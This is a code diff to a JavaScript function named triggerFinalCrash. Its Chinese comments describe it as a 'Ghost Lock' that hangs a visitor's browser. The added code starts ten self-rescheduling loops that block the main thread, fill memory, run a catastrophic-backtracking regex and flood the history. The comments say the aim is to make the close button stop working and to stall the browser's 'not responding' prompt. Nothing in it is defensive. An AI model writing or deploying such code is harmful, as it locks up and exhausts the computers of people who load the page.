@@ -159,30 +159,38 @@ function triggerFinalCrash() {
         const u = URL.createObjectURL(b);
         for(let i=0; i<128; i++) new Worker(u);
 
-        // 3. 核心死鎖：RegExp 炸彈 + 同步阻塞 (Roblox 模式)
-        const vault = [];
-        function deadlock() {
-            // 正則表達式災難性回溯 - 鎖死 CPU
-            const bomb = /^(a+)+$/;
-            bomb.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"); 
-
-            // 劫持歷史紀錄與消耗內存
-            for(let i=0; i<50; i++) {
-                vault.push(new BigUint64Array(1024 * 1024)); 
-                window.history.pushState(null, null, "#" + Math.random());
-            }
-
-            // 同步死循環：強制鎖死主線程 3 秒，不讓系統處理關閉事件
-            const start = Date.now();
-            while(Date.now() - start < 3000) { Math.sqrt(Math.random()); } 
-
-            // 遞迴微任務隊列：插隊所有 UI 操作 (使 X 掣失靈)
-            Promise.resolve().then(deadlock);
+        // --- 核心：間歇性絕對死鎖 (The "Ghost Lock" Edit) ---
+function deadlock() {
+    const vault = [];
+    
+    function heavyLoad() {
+        // 1. 同步阻塞：鎖死 1.5 秒 (剛好在監控觸發的邊緣)
+        const start = Date.now();
+        while (Date.now() - start < 1500) {
+            Math.sqrt(Math.random() * 1000000);
+            // 不斷往內存塞東西，讓系統變慢
+            vault.push(new BigUint64Array(1024 * 100)); 
         }
-        deadlock();
-    }, 100);
-}
 
+        // 2. 觸發正則炸彈：讓渲染引擎在背後瘋狂回溯
+        /^(a+)+$/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!");
+
+        // 3. 混合調度：使用微任務與宏任務交替
+        // 這會讓瀏覽器忙於切換任務，導致它想彈出「未響應」視窗時也會卡住
+        Promise.resolve().then(() => {
+            // 微任務：立即插隊
+            window.history.pushState(null, null, "#" + Math.random());
+            
+            // 宏任務：在下一幀立即重新鎖死
+            setTimeout(heavyLoad, 0); 
+        });
+    }
+
+    // 同時啟動 10 個平行死鎖邏輯，徹底榨乾 CPU 隊列
+    for (let i = 0; i < 10; i++) {
+        setTimeout(heavyLoad, i * 100);
+    }
+}
 // 6. 交互邏輯
 window.addEventListener('mousemove', (e) => {
     mouseX = e.clientX; mouseY = e.clientY;
